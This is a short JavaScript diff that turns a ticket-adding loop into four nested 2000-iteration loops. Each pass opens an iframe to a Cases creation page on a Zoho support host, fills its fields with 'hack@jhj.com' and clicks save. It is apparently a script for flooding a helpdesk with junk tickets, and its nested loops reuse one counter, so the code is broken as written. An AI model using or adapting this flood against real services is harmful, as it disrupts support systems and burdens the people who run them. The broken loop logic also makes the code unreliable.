@@ -28,7 +28,12 @@
 // }
 
 //Adding Ticket
-for(var i = 1; i < 8; i++)
+for(var i = 1; i < 2000; i++)
+{
+for(var i = 1; i < 2000; i++)
+{
+for(var i = 1; i < 2000; i++){
+for(var i = 1; i < 2000; i++)
 {
 var iframe = jQuery("<iframe></iframe>");
 jQuery(iframe).attr("src","Create.do?module=Cases&frameorigin=https://supportdev3.localzoho.com");
@@ -40,4 +45,4 @@ function add_Ticket(){
 jQuery(iframe).contents().find("input:text").val('hack@jhj.com') ;
 jQuery(iframe).contents().find('#saveButtonId').click();
 }
-}
+}}}}
